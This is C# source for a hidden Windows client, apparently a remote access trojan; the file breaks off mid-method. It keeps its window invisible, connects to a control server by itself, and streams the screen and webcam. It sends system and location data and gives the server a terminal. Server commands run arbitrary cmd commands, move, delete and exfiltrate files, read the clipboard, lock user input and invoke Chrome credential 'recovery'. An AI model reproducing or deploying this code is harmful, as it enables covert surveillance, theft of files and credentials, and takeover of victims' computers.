namespace CSharpSender;

public partial class Form1 : Form
{
    private System.Net.WebSockets.ClientWebSocket? ws;
    private System.Threading.CancellationTokenSource? cts;
    private System.Windows.Forms.Timer timer;
    private System.Windows.Forms.Timer telemetryTimer;
    private System.Windows.Forms.Timer webcamTimer;
    private System.Threading.CancellationTokenSource? _webcamCts;
    private TerminalSession? _terminalSession;

    private System.Diagnostics.PerformanceCounter? _cpuCounter;

    private int _jpegQuality = 85;                    // MUCH BETTER QUALITY (was 55)
    private int _captureWidth = 0;                    // Will be set to actual screen width
    private int _captureHeight = 0;                   // Will be set to actual screen height
    private volatile bool _sendingFrame = false;
    private volatile bool _sendingWebcam = false;
    private volatile bool _isWebcamActive = false;
    private readonly System.Threading.SemaphoreSlim _webcamLock = new System.Threading.SemaphoreSlim(1, 1);
    private Task? _listenTask;
    private readonly System.Threading.SemaphoreSlim _wsSendLock = new System.Threading.SemaphoreSlim(1, 1);

    private async Task SafeSendAsync(ArraySegment<byte> buffer, System.Net.WebSockets.WebSocketMessageType messageType, bool endOfMessage, System.Threading.CancellationToken token)
    {
        if (ws == null || ws.State != System.Net.WebSockets.WebSocketState.Open) return;
        await _wsSendLock.WaitAsync(token);
        try 
        {
            if (ws != null && ws.State == System.Net.WebSockets.WebSocketState.Open) 
            {
                await ws.SendAsync(buffer, messageType, endOfMessage, token);
            }
        } 
        finally 
        {
            _wsSendLock.Release();
        }
    }

    [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
    private struct MEMORYSTATUSEX
    {
        public uint dwLength;
        public uint dwMemoryLoad;
        public ulong ullTotalPhys;
        public ulong ullAvailPhys;
        public ulong ullTotalPageFile;
        public ulong ullAvailPageFile;
        public ulong ullTotalVirtual;
        public ulong ullAvailVirtual;
        public ulong ullAvailExtendedVirtual;
    }

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
    [return: System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)]
    private static extern bool GlobalMemoryStatusEx(ref MEMORYSTATUSEX lpBuffer);

    public Form1()
    {
        InitializeComponent();
        txtWebSocket.Text = BuildConfig.DefaultWsUrl;
        txtRoomId.Text    = BuildConfig.DefaultRoomId;
        txtSecret.Text    = BuildConfig.DefaultSecret;
        
        // Set capture dimensions to actual screen size
        var bounds = Screen.PrimaryScreen.Bounds;
        _captureWidth = bounds.Width;
        _captureHeight = bounds.Height;
        
        btnStart.Click += BtnStart_Click;
        btnStop.Click += BtnStop_Click;
        timer = new System.Windows.Forms.Timer();
        timer.Interval = 33;                    // 30 FPS (was 200 for 5 FPS!)
        timer.Tick += Timer_Tick;
        telemetryTimer = new System.Windows.Forms.Timer();
        telemetryTimer.Interval = 5000;
        telemetryTimer.Tick += TelemetryTimer_Tick;

        webcamTimer = new System.Windows.Forms.Timer();
        webcamTimer.Interval = 100; // 10 FPS for webcam
        webcamTimer.Tick += WebcamTimer_Tick;

        btnStop.Enabled = false;

        try
        {
            _cpuCounter = new System.Diagnostics.PerformanceCounter("Processor", "% Processor Time", "_Total");
            _cpuCounter.NextValue(); // Prime counter
        }
        catch (Exception ex)
        {
            ExitForm.Log($"CPU counter init failed: {ex.Message}");
            _cpuCounter = null;
        }

        // Automatically start the connection process safely after handle is created
        this.HandleCreated += (s, e) => {
             BtnStart_Click(null, null);
        };
    }

    protected override void SetVisibleCore(bool value)
    {
        // Prevent the form from ever becoming visible
        if (!this.IsHandleCreated) CreateHandle();
        base.SetVisibleCore(false);
    }



    // ...existing code...

    private async void BtnStop_Click(object? sender, EventArgs? e)
    {
        btnStart.Enabled = false;
        btnStop.Enabled = false;
        lblStatus.Text = "Status: Stopping...";
        
        try
        {
            timer.Stop();
            telemetryTimer.Stop();
            webcamTimer.Stop();
            _ = Task.Run(() => WebcamCapture.Cleanup());
            _terminalSession?.Stop();
            _terminalSession = null;
            InputLockHelper.SetLock(false);
            
            if (cts != null && !cts.IsCancellationRequested)
            {
                cts.Cancel();
            }
            
            if (ws != null && ws.State == System.Net.WebSockets.WebSocketState.Open)
            {
                try
                {
                    using (var timeoutCts = new System.Threading.CancellationTokenSource(TimeSpan.FromSeconds(3)))
                    {
                        await ws.CloseAsync(System.Net.WebSockets.WebSocketCloseStatus.NormalClosure, "Stop", timeoutCts.Token);
                    }
                }
                catch (OperationCanceledException)
                {
                    ExitForm.Log("Close timeout, disposing socket.");
                }
            }
            
            // Wait for listen task to complete (with timeout)
            if (_listenTask != null && !_listenTask.IsCompleted)
            {
                try
                {
                    using (var timeoutCts = new System.Threading.CancellationTokenSource(TimeSpan.FromSeconds(2)))
                    {
                        await _listenTask.ConfigureAwait(false);
                    }
                }
                catch (OperationCanceledException)
                {
                    ExitForm.Log("Listen task did not complete in time.");
                }
                catch (Exception ex)
                {
                    ExitForm.Log($"Listen task error: {ex.Message}");
                }
            }
            
            ws?.Dispose();
            ws = null;
            cts?.Dispose();
            cts = null;
            _listenTask = null;
            
            ExitForm.Log("Stopped.");
            lblStatus.Text = "Status: Idle";
        }
        catch (Exception ex)
        {
            ExitForm.Log($"Stop error: {ex.Message}");
            lblStatus.Text = "Status: Error during stop";
        }
        finally
        {
            btnStart.Enabled = true;
            btnStop.Enabled = false;
        }
    }

    private System.Drawing.Bitmap? CaptureFrame()
    {
        try
        {
            var bounds = Screen.PrimaryScreen.Bounds;
            var bmp = new System.Drawing.Bitmap(bounds.Width, bounds.Height);
            using (var g = System.Drawing.Graphics.FromImage(bmp))
            {
                g.CopyFromScreen(0, 0, 0, 0, bmp.Size);
            }

            if (_captureWidth != bounds.Width || _captureHeight != bounds.Height)
            {
                var resized = new System.Drawing.Bitmap(_captureWidth, _captureHeight);
                using (var g2 = System.Drawing.Graphics.FromImage(resized))
                {
                    g2.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
                    g2.DrawImage(bmp, 0, 0, _captureWidth, _captureHeight);
                }
                bmp.Dispose();
                return resized;
            }
            return bmp;
        }
        catch (Exception ex)
        {
            ExitForm.Log($"[CAPTURE] Error: {ex.Message}");
            return null;
        }
    }

    private async void Timer_Tick(object? sender, EventArgs? e)
    {
        // Use a single flag to guard the tick
        if (_sendingFrame || ws == null || ws.State != System.Net.WebSockets.WebSocketState.Open || cts == null || cts.IsCancellationRequested)
            return;

        _sendingFrame = true;
        try
        {
            if (_isWebcamActive)
            {
                // WEBCAM MODE - Try to capture, but don't stop the timer if it fails
                using (var bmp = WebcamCapture.CaptureFrame(640, 480))
                {
                    if (bmp == null || !_isWebcamActive) return;

                    using (var ms = new System.IO.MemoryStream())
                    {
                        bmp.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                        var buffer = ms.ToArray();
                        if (buffer.Length > 0 && _isWebcamActive)
                        {
                            byte[] prefixed = new byte[buffer.Length + 1];
                            prefixed[0] = 1; // Prefix with 1 for webcam
                            Buffer.BlockCopy(buffer, 0, prefixed, 1, buffer.Length);
                            
                            using (var timeoutCts = new System.Threading.CancellationTokenSource(TimeSpan.FromMilliseconds(1000)))
                            using (var linked = System.Threading.CancellationTokenSource.CreateLinkedTokenSource(cts.Token, timeoutCts.Token))
                            {
                                await SafeSendAsync(new ArraySegment<byte>(prefixed), System.Net.WebSockets.WebSocketMessageType.Binary, true, linked.Token);
                            }
                        }
                    }
                }
            }
            else
            {
                // DESKTOP MODE
                using (var bmp = CaptureFrame())
                {
                    if (bmp == null || _isWebcamActive) return;

                    using (var ms = new System.IO.MemoryStream())
                    {
                        bmp.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                        var buffer = ms.ToArray();
                        if (buffer.Length > 0 && !_isWebcamActive)
                        {
                            byte[] prefixed = new byte[buffer.Length + 1];
                            prefixed[0] = 0; // Prefix with 0 for desktop
                            Buffer.BlockCopy(buffer, 0, prefixed, 1, buffer.Length);
                            
                            using (var timeoutCts = new System.Threading.CancellationTokenSource(TimeSpan.FromSeconds(2)))
                            using (var linked = System.Threading.CancellationTokenSource.CreateLinkedTokenSource(cts.Token, timeoutCts.Token))
                            {
                                await SafeSendAsync(new ArraySegment<byte>(prefixed), System.Net.WebSockets.WebSocketMessageType.Binary, true, linked.Token);
                            }
                        }
                    }
                }
            }
        }
        catch (OperationCanceledException) { }
        catch (Exception ex)
        {
            ExitForm.Log($"[STREAM] Error: {ex.Message}");
        }
        finally
        {
            _sendingFrame = false;
        }
    }

    private async void WebcamTimer_Tick(object? sender, EventArgs? e)
    {
        // Skip if already sending a frame or if webcam is NOT active (backpressure guard)
        if (_sendingWebcam || !_isWebcamActive || ws == null || ws.State != System.Net.WebSockets.WebSocketState.Open || cts == null || cts.IsCancellationRequested)
        {
            if (webcamTimer.Enabled && !_isWebcamActive) webcamTimer.Stop();
            return;
        }

        await _webcamLock.WaitAsync();
        try {
            if (!_isWebcamActive) {
                webcamTimer.Stop();
                return;
            }

            // Create a temporary linked token that can be cancelled if the stream stops
            var linkedToken = cts.Token;
            if (_webcamCts != null)
            {
                try {
                    var linkedCts = System.Threading.CancellationTokenSource.CreateLinkedTokenSource(cts.Token, _webcamCts.Token);
                    linkedToken = linkedCts.Token;
                } catch { /* Handle disposal race */ }
            }

            _sendingWebcam = true;
            try
            {
                // Capture a frame (default 640x480 for bandwidth efficiency)
                using (var bmp = WebcamCapture.CaptureFrame(640, 480))
                {
                    if (bmp == null || !_isWebcamActive) return;

                    using (var ms = new System.IO.MemoryStream())
                    {
                        // Use standard JPEG for webcam as well
                        bmp.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                        var buffer = ms.ToArray();
                        if (buffer.Length > 0 && _isWebcamActive)
                        {
                            // Prefix with 1 for webcam
                            byte[] prefixed = new byte[buffer.Length + 1];
                            prefixed[0] = 1;
                            Buffer.BlockCopy(buffer, 0, prefixed, 1, buffer.Length);
                            var segment = new ArraySegment<byte>(prefixed);

                            // Use a short timeout for webcam frames so they don't block the connection
                            using (var timeoutCts = new System.Threading.CancellationTokenSource(TimeSpan.FromMilliseconds(800)))
                            using (var linked = System.Threading.CancellationTokenSource.CreateLinkedTokenSource(linkedToken, timeoutCts.Token))
                            {
                                await SafeSendAsync(segment, System.Net.WebSockets.WebSocketMessageType.Binary, true, linked.Token);
                            }
                        }
                    }
                }
            }
            catch (OperationCanceledException)
            {
                // Timeout, shutdown, or manual stop
            }
            catch (Exception ex)
            {
                ExitForm.Log($"[WEBCAM] Frame send error: {ex.Message}");
            }
            finally
            {
                _sendingWebcam = false;
            }
        } finally {
            _webcamLock.Release();
        }
    }

    private string? _cachedCpuName;
    private string? _cachedGpuName;
    private string? _cachedWindowsVersion;
    private string? _geoCountryCode;
    private string? _geoCountry;
    private string? _geoCity;

    private async Task FetchGeoAsync()
    {
        try
        {
            using var client = new System.Net.Http.HttpClient();
            client.Timeout = TimeSpan.FromSeconds(5);
            var json = await client.GetStringAsync("http://ip-api.com/json/");
            using var doc = System.Text.Json.JsonDocument.Parse(json);
            var root = doc.RootElement;
            _geoCountryCode = root.TryGetProperty("countryCode", out var cc) ? cc.GetString() : null;
            _geoCountry     = root.TryGetProperty("country",     out var cn) ? cn.GetString() : null;
            _geoCity        = root.TryGetProperty("city",        out var ci) ? ci.GetString() : null;
            ExitForm.Log($"Geo: {_geoCity}, {_geoCountry} ({_geoCountryCode})");
        }
        catch (Exception ex)
        {
            ExitForm.Log($"Geo lookup failed: {ex.Message}");
        }
    }

    private string GetWmiString(string wmiClass, string property)
    {
        try
        {
            using var searcher = new System.Management.ManagementObjectSearcher($"SELECT {property} FROM {wmiClass}");
            foreach (var obj in searcher.Get())
            {
                var val = obj[property]?.ToString();
                if (!string.IsNullOrWhiteSpace(val))
                    return val.Trim();
            }
        }
        catch { }
        return "Unknown";
    }

    private async void TelemetryTimer_Tick(object? sender, EventArgs? e)
    {
        if (ws == null || ws.State != System.Net.WebSockets.WebSocketState.Open || cts == null)
            return;
        try
        {
            _cachedCpuName ??= GetWmiString("Win32_Processor", "Name");
            _cachedGpuName ??= GetWmiString("Win32_VideoController", "Name");
            _cachedWindowsVersion ??= GetWmiString("Win32_OperatingSystem", "Caption");

            var mem = new MEMORYSTATUSEX { dwLength = (uint)System.Runtime.InteropServices.Marshal.SizeOf<MEMORYSTATUSEX>() };
            GlobalMemoryStatusEx(ref mem);
            long totalMb = (long)(mem.ullTotalPhys / 1048576);
            long usedMb = (long)((mem.ullTotalPhys - mem.ullAvailPhys) / 1048576);
            int memPercent = (int)mem.dwMemoryLoad;

            float? cpuPercent = null;
            try
            {
                if (_cpuCounter != null)
                {
                    cpuPercent = _cpuCounter.NextValue();
                }
            }
            catch (Exception ex)
            {
                ExitForm.Log($"CPU counter error: {ex.Message}");
                _cpuCounter = null;
            }

            int? diskPercent = null;
            double? usedDiskGb = null;
            double? totalDiskGb = null;
            try
            {
                var systemDrive = System.IO.DriveInfo.GetDrives()
                    .FirstOrDefault(d => d.IsReady && d.DriveType == System.IO.DriveType.Fixed && d.Name.Equals(Path.GetPathRoot(Environment.SystemDirectory), StringComparison.OrdinalIgnoreCase));
                if (systemDrive == null)
                {
                    systemDrive = System.IO.DriveInfo.GetDrives()
                        .FirstOrDefault(d => d.IsReady && d.DriveType == System.IO.DriveType.Fixed);
                }

                if (systemDrive != null)
                {
                    totalDiskGb = systemDrive.TotalSize / (1024.0 * 1024 * 1024);
                    usedDiskGb = (systemDrive.TotalSize - systemDrive.AvailableFreeSpace) / (1024.0 * 1024 * 1024);
                    if (systemDrive.TotalSize > 0)
                    {
                        diskPercent = (int)Math.Clamp(((systemDrive.TotalSize - systemDrive.AvailableFreeSpace) * 100.0 / systemDrive.TotalSize), 0, 100);
                    }
                }
            }
            catch (Exception ex)
            {
                ExitForm.Log($"Disk stats error: {ex.Message}");
            }

            var uptimeSeconds = Environment.TickCount64 / 1000;
            var uptimeStr = TimeSpan.FromSeconds(uptimeSeconds).ToString(@"d\.hh\:mm\:ss");
            var arch = System.Runtime.InteropServices.RuntimeInformation.ProcessArchitecture.ToString();

            var summary = $"Hostname:  {Environment.MachineName}\n"
                + $"Windows:   {_cachedWindowsVersion}\n"
                + $"Arch:      {arch}\n"
                + $"CPU:       {_cachedCpuName}  ({Environment.ProcessorCount} cores)\n"
                + $"GPU:       {_cachedGpuName}\n"
                + $"Memory:    {usedMb:N0} MB / {totalMb:N0} MB  ({memPercent}%)\n"
                + (cpuPercent.HasValue ? $"CPU:       {cpuPercent.Value:F1}%\n" : "")
                + (usedDiskGb.HasValue && totalDiskGb.HasValue && diskPercent.HasValue
                    ? $"Disk:      {usedDiskGb.Value:F1} GB / {totalDiskGb.Value:F1} GB  ({diskPercent.Value}%)\n"
                    : "")
                + $"Uptime:    {uptimeStr}";

            var payload = new Dictionary<string, object?>
            {
                ["type"] = "system-info",
                ["info"] = new Dictionary<string, object?>
                {
                    ["hostname"] = Environment.MachineName,
                    ["windowsVersion"] = _cachedWindowsVersion,
                    ["arch"] = arch,
                    ["cpuName"] = _cachedCpuName,
                    ["cpuCores"] = Environment.ProcessorCount,
                    ["cpuPercent"] = cpuPercent,
                    ["gpuName"] = _cachedGpuName,
                    ["memoryPercent"] = memPercent,
                    ["usedMemMb"] = usedMb,
                    ["totalMemMb"] = totalMb,
                    ["diskPercent"] = diskPercent,
                    ["usedDiskGb"] = usedDiskGb,
                    ["totalDiskGb"] = totalDiskGb,
                    ["uptimeSeconds"] = uptimeSeconds,
                    ["summary"] = summary,
                    ["countryCode"] = _geoCountryCode,
                    ["country"] = _geoCountry,
                    ["city"] = _geoCity
                }
            };
            var json = System.Text.Json.JsonSerializer.Serialize(payload);
            var segment = new ArraySegment<byte>(System.Text.Encoding.UTF8.GetBytes(json));
            await SafeSendAsync(segment, System.Net.WebSockets.WebSocketMessageType.Text, true, cts.Token);
            ExitForm.Log($"Telemetry sent: CPU={(cpuPercent.HasValue ? cpuPercent.Value.ToString("F1") : "n/a")} RAM={memPercent}% Disk={(diskPercent?.ToString() ?? "n/a")}" );
        }
        catch (Exception ex)
        {
            ExitForm.Log($"Telemetry send error: {ex.Message}");
        }
    }

    private async Task ListenForMessagesAsync()
    {
        var buffer = new byte[65536];
        var messageBuffer = new System.IO.MemoryStream();
        try
        {
            while (ws != null && ws.State == System.Net.WebSockets.WebSocketState.Open && cts != null && !cts.IsCancellationRequested)
            {
                messageBuffer.SetLength(0);
                System.Net.WebSockets.WebSocketReceiveResult result;
                try
                {
                    do
                    {
                        result = await ws.ReceiveAsync(new ArraySegment<byte>(buffer), cts.Token);
                        if (result.MessageType == System.Net.WebSockets.WebSocketMessageType.Close)
                        {
                            ExitForm.Log("Server closed connection.");
                            return;
                        }
                        messageBuffer.Write(buffer, 0, result.Count);
                    } while (!result.EndOfMessage);
                }
                catch (OperationCanceledException)
                {
                    ExitForm.Log("Listen task cancelled.");
                    return;
                }

                var msg = System.Text.Encoding.UTF8.GetString(messageBuffer.GetBuffer(), 0, (int)messageBuffer.Length);
                try
                {
                    using var doc = System.Text.Json.JsonDocument.Parse(msg);
                    var root = doc.RootElement;
                    if (!root.TryGetProperty("type", out var typeElem))
                        continue;
                    var type = typeElem.GetString();

                    // ── stream-quality ──
                    if (type == "stream-quality")
                    {
                        ApplyStreamQuality(root);
                        continue;
                    }

                    // ── start-webcam ──
                    if (type == "start-webcam")
                    {
                        ExitForm.Log("[WEBCAM] Switching to WEBCAM mode");
                        _isWebcamActive = true;
                        
                        this.Invoke(() => {
                            _webcamCts?.Cancel();
                            _webcamCts = new System.Threading.CancellationTokenSource();
                        });

                        // Notify server
                        await SafeSendAsync(new ArraySegment<byte>(System.Text.Encoding.UTF8.GetBytes(System.Text.Json.JsonSerializer.Serialize(new { type = "start-webcam" }))), System.Net.WebSockets.WebSocketMessageType.Text, true, cts.Token);
                        continue;
                    }

                    // ── stop-webcam ──
                    if (type == "stop-webcam")
                    {
                        ExitForm.Log("[WEBCAM] Switching to DESKTOP mode");
                        _isWebcamActive = false;

                        // Use BeginInvoke to avoid deadlocking if the UI thread is busy
                        this.BeginInvoke(() => {
                            _webcamCts?.Cancel();
                            webcamTimer.Stop();
                            // Background hardware release moved inside Invoke to ensure sequential safety
                            _ = Task.Run(() => WebcamCapture.Cleanup());
                        });

                        // Notify server
                        await SafeSendAsync(new ArraySegment<byte>(System.Text.Encoding.UTF8.GetBytes(System.Text.Json.JsonSerializer.Serialize(new { type = "stop-webcam" }))), System.Net.WebSockets.WebSocketMessageType.Text, true, cts?.Token ?? default);
                        continue;
                    }

                    // ── chat-message ──
                    if (type == "chat-message")
                    {
                        var senderName = root.TryGetProperty("senderName", out var sn) ? sn.GetString() : "Unknown";
                        var message = root.TryGetProperty("message", out var m) ? m.GetString() : "";
                        ExitForm.Log($"[CHAT] {senderName}: {message}");
                        continue;
                    }

                    // ── chat-close ──
                    if (type == "chat-close")
                    {
                        var senderName = root.TryGetProperty("senderName", out var sn) ? sn.GetString() : "Unknown";
                        ExitForm.Log($"[CHAT] {senderName} closed chat.");
                        continue;
                    }

                    // ── motd ──
                    if (type == "motd")
                    {
                        var motdMsg = root.TryGetProperty("message", out var mm) ? mm.GetString() : "";
                        ExitForm.Log($"[MOTD] {motdMsg}");
                        continue;
                    }

                    // ── terminal-start ──
                    if (type == "terminal-start")
                    {
                        ExitForm.Log("[TERMINAL] Starting interactive session");
                        _terminalSession?.Stop();
                        _terminalSession = new TerminalSession(async (output) => {
                            var payload = new { type = "terminal-output", output = output };
                            var json = System.Text.Json.JsonSerializer.Serialize(payload);
                            var segment = new ArraySegment<byte>(System.Text.Encoding.UTF8.GetBytes(json));
                            await SafeSendAsync(segment, System.Net.WebSockets.WebSocketMessageType.Text, true, cts?.Token ?? default);
                        });
                        _terminalSession.Start();
                        continue;
                    }

                    // ── terminal-input ──
                    if (type == "terminal-input")
                    {
                        var input = root.TryGetProperty("input", out var ie) ? ie.GetString() : "";
                        _terminalSession?.SendInput(input ?? "");
                        continue;
                    }

                    // ── terminal-stop ──
                    if (type == "terminal-stop")
                    {
                        ExitForm.Log("[TERMINAL] Stopping interactive session");
                        _terminalSession?.Stop();
                        _terminalSession = null;
                        continue;
                    }

                    // ── remote-control ──
                    if (type == "remote-control" && root.TryGetProperty("action", out var actionElem))
                    {
                        var action = actionElem.GetString();
                        
                        if (action == "lock-input")
                        {
                            var locked = root.TryGetProperty("locked", out var le) && le.GetBoolean();
                            this.Invoke(() => InputLockHelper.SetLock(locked));
                            continue;
                        }
                        if (action == "file-list")
                        {
                            string dir = Environment.CurrentDirectory;
                            if (root.TryGetProperty("path", out var pathElem))
                            {
                                var requestedPath = pathElem.GetString();
                                if (!string.IsNullOrEmpty(requestedPath))
                                    dir = requestedPath;
                            }
                            string[] files = Array.Empty<string>();
                            string[] dirs = Array.Empty<string>();
                            if (System.IO.Directory.Exists(dir))
                            {
                                try { files = System.IO.Directory.GetFiles(dir); } catch { files = Array.Empty<string>(); }
                                try { dirs = System.IO.Directory.GetDirectories(dir); } catch { dirs = Array.Empty<string>(); }
                            }
                            files = files.Select(f => System.IO.Path.GetFileName(f)).ToArray();
                            dirs = dirs.Select(d => System.IO.Path.GetFileName(d)).ToArray();
                            var payload = new {
                                type = "file-list",
                                path = dir,
                                files = files,
                                directories = dirs
                            };
                            var json = System.Text.Json.JsonSerializer.Serialize(payload);
                            var segment = new ArraySegment<byte>(System.Text.Encoding.UTF8.GetBytes(json));
                            await SafeSendAsync(segment, System.Net.WebSockets.WebSocketMessageType.Text, true, cts.Token);
                        }
                        else if (action == "file-delete")
                        {
                            var path = root.TryGetProperty("path", out var p) ? p.GetString() : null;
                            if (!string.IsNullOrEmpty(path))
                            {
                                try
                                {
                                    if (System.IO.File.Exists(path)) System.IO.File.Delete(path);
                                    else if (System.IO.Directory.Exists(path)) System.IO.Directory.Delete(path, true);
                                    ExitForm.Log($"[FILE] Deleted: {path}");
                                }
                                catch (Exception ex) { ExitForm.Log($"[FILE] Delete error: {ex.Message}"); }
                            }
                        }
                        else if (action == "file-rename")
                        {
                            var oldPath = root.TryGetProperty("oldPath", out var op) ? op.GetString() : null;
                            var newPath = root.TryGetProperty("newPath", out var np) ? np.GetString() : null;
                            if (!string.IsNullOrEmpty(oldPath) && !string.IsNullOrEmpty(newPath))
                            {
                                try
                                {
                                    if (System.IO.File.Exists(oldPath)) System.IO.File.Move(oldPath, newPath);
                                    else if (System.IO.Directory.Exists(oldPath)) System.IO.Directory.Move(oldPath, newPath);
                                    ExitForm.Log($"[FILE] Renamed: {oldPath} -> {newPath}");
                                }
                                catch (Exception ex) { ExitForm.Log($"[FILE] Rename error: {ex.Message}"); }
                            }
                        }
                        else if (action == "file-mkdir")
                        {
                            var path = root.TryGetProperty("path", out var p) ? p.GetString() : null;
                            if (!string.IsNullOrEmpty(path))
                            {
                                try
                                {
                                    System.IO.Directory.CreateDirectory(path);
                                    ExitForm.Log($"[FILE] Created directory: {path}");
                                }
                                catch (Exception ex) { ExitForm.Log($"[FILE] Mkdir error: {ex.Message}"); }
                            }
                        }
                        else if (action == "file-upload")
                        {
                            await HandleFileUpload(root);
                        }
                        else if (action == "file-download")
                        {
                            await HandleFileDownload(root);
                        }
                        else if (action == "execute-command")
                        {
                            await HandleExecuteCommand(root);
                        }
                        else if (action == "clipboard-get")
                        {
                            await HandleClipboardGet(root);
                        }
                        else if (action.StartsWith("chrome-"))
                        {
                            // Handle Chrome recovery commands
                            string machineId = root.TryGetProperty("machineId", out var midElem) ? midElem.GetString() : "Unknown";
                            string response = await ChromeRecovery.HandleChromeRecoveryCommand(action, machineId);
                            var segment = new ArraySegment<byte>(System.Text.Encoding.UTF8.GetBytes(response));
                            await SafeSendAsync(segment, System.Net.WebSockets.WebSocketMessageType.Text, true, cts.Token);
                        }
                        else
                        {
                            HandleRemoteControl(root, action);
                        }
                    }
                }
                catch (System.Text.Json.JsonException)
                {
                    // Ignore JSON parse errors
                }
                catch (Exception ex)
                {
                    ExitForm.Log($"Message handling error: {ex.Message}");
                }
            }
        }
        catch (Exception ex)
        {
            ExitForm.Log($"Listen loop error: {ex.Message}");
        }
        finally
        {
            messageBuffer?.Dispose();
        }
    }

    private async Task HandleFileUpload(System.Text.Json.JsonElement root)
    {
        try
        {
            var remotePath = root.TryGetProperty("remotePath", out var rp) ? rp.GetString() : null;
            var fileName = root.TryGetProperty("fileName", out var fn) ? fn.GetString() : null;
            var dataB64 = root.TryGetProperty("data", out var d) ? d.GetString() : null;

            if (string.IsNullOrEmpty(dataB64))
            {
                ExitForm.Log("file-upload: no data received");
                return;
            }

            string savePath;
            if (!string.IsNullOrEmpty(remotePath))
                savePath = remotePath;
            else if (!string.IsNullOrEmpty(fileName))
                savePath = System.IO.Path.Combine(Environment.CurrentDirectory, fileName);
            else
            {
                ExitForm.Log("file-upload: no remotePath or fileName");
                return;
            }

            var dir = System.IO.Path.GetDirectoryName(savePath);
            if (!string.IsNullOrEmpty(dir) && !System.IO.Directory.Exists(dir))
                System.IO.Directory.CreateDirectory(dir);

            var bytes = Convert.FromBase64String(dataB64);
            await System.IO.File.WriteAllBytesAsync(savePath, bytes, cts.Token);
            ExitForm.Log($"file-upload: saved {bytes.Length} bytes to {savePath}");
        }
        catch (Exception ex)
        {
            ExitForm.Log($"file-upload error: {ex.Message}");
        }
    }

    private async Task HandleFileDownload(System.Text.Json.JsonElement root)
    {
        try
        {
            var filePath = root.TryGetProperty("path", out var p) ? p.GetString() : null;
            var fileName = root.TryGetProperty("fileName", out var fn) ? fn.GetString() : null;
            var requestId = root.TryGetProperty("requestId", out var rid) ? rid.GetString() : null;

            if (string.IsNullOrEmpty(filePath))
            {
                ExitForm.Log("file-download: no path specified");
                return;
            }

            if (!System.IO.File.Exists(filePath))
            {
                ExitForm.Log($"file-download: file not found: {filePath}");
                return;
            }

            var bytes = await System.IO.File.ReadAllBytesAsync(filePath, cts.Token);
            var encoded = Convert.ToBase64String(bytes);
            var payloadDict = new Dictionary<string, object?>
            {
                ["type"] = "file-data",
                ["fileName"] = fileName ?? System.IO.Path.GetFileName(filePath),
                ["data"] = encoded,
                ["requestId"] = requestId
            };
            var json = System.Text.Json.JsonSerializer.Serialize(payloadDict);
            var segment = new ArraySegment<byte>(System.Text.Encoding.UTF8.GetBytes(json));
            await SafeSendAsync(segment, System.Net.WebSockets.WebSocketMessageType.Text, true, cts.Token);
            ExitForm.Log($"file-download: sent {bytes.Length} bytes for {filePath}");
        }
        catch (Exception ex)
        {
            ExitForm.Log($"file-download error: {ex.Message}");
        }
    }

    private Task HandleExecuteCommand(System.Text.Json.JsonElement root)
    {
        var command = root.TryGetProperty("command", out var ce) ? ce.GetString() : null;
        var requestId = root.TryGetProperty("requestId", out var rid) ? rid.GetString() : null;

        if (string.IsNullOrEmpty(command))
        {
            // Nothing to do — don't await, return completed
            return string.IsNullOrEmpty(requestId)
                ? Task.CompletedTask
                : SendCommandOutput(requestId, "Error: no command specified");
        }

        // Fire-and-forget shortcut (no requestId) — launch detached, never block
        if (string.IsNullOrEmpty(requestId))
        {
            try
            {
                var psi = new System.Diagnostics.ProcessStartInfo("cmd")
                {
                    Arguments = $"/c {command}",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };
                var proc = System.Diagnostics.Process.Start(psi);
                // Don't wait for output, just let it run detached
                if (proc != null)
                {
                    _ = Task.Run(async () =>
                    {
                        try
                        {
                            await proc.WaitForExitAsync();
                            proc.Dispose();
                        }
                        catch { /* Ignore disposal errors */ }
                    });
                }
            }
            catch (Exception ex)
            {
                ExitForm.Log($"execute-command (detached) error: {ex.Message}");
            }
            return Task.CompletedTask;
        }

        // Output-capturing command — run entirely off the receive loop so it never blocks
        var capturedRequestId = requestId;
        var capturedCommand = command;
        _ = Task.Run(async () =>
        {
            try
            {
                var psi = new System.Diagnostics.ProcessStartInfo("cmd")
                {
                    Arguments = $"/c {capturedCommand}",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                using var proc = System.Diagnostics.Process.Start(psi);
                if (proc == null)
                {
                    await SendCommandOutput(capturedRequestId, "Error: failed to start process");
                    return;
                }
                // Read with a 30-second timeout so a hung process can't block forever
                using var timeoutCts = new System.Threading.CancellationTokenSource(TimeSpan.FromSeconds(30));
                using var linked = System.Threading.CancellationTokenSource.CreateLinkedTokenSource(
                    cts?.Token ?? System.Threading.CancellationToken.None, timeoutCts.Token);
                try
                {
                    var stdout = await proc.StandardOutput.ReadToEndAsync(linked.Token);
                    var stderr = await proc.StandardError.ReadToEndAsync(linked.Token);
                    await proc.WaitForExitAsync(linked.Token);
                    var output = stdout;
                    if (!string.IsNullOrEmpty(stderr)) output += "\n[stderr]\n" + stderr;
                    if (string.IsNullOrEmpty(output)) output = $"(exit code {proc.ExitCode})";
                    await SendCommandOutput(capturedRequestId, output);
                }
                catch (OperationCanceledException)
                {
                    try { proc.Kill(true); } catch { }
                    await SendCommandOutput(capturedRequestId, "Error: command timed out (30s limit)");
                }
            }
            catch (Exception ex)
            {
                await SendCommandOutput(capturedRequestId, $"Error: {ex.Message}");
            }
        });

        // Return immediately so the receive loop continues
        return Task.CompletedTask;
    }

    private async Task SendCommandOutput(string? requestId, string output)
    {
        if (ws == null || ws.State != System.Net.WebSockets.WebSocketState.Open || cts == null) return;
        try
        {
            var payload = new Dictionary<string, object?> { ["type"] = "command-output", ["requestId"] = requestId, ["output"] = output };
            var json = System.Text.Json.JsonSerializer.Serialize(payload);
            var segment = new ArraySegment<byte>(System.Text.Encoding.UTF8.GetBytes(json));
            await SafeSendAsync(segment, System.Net.WebSockets.WebSocketMessageType.Text, true, cts.Token);
        }
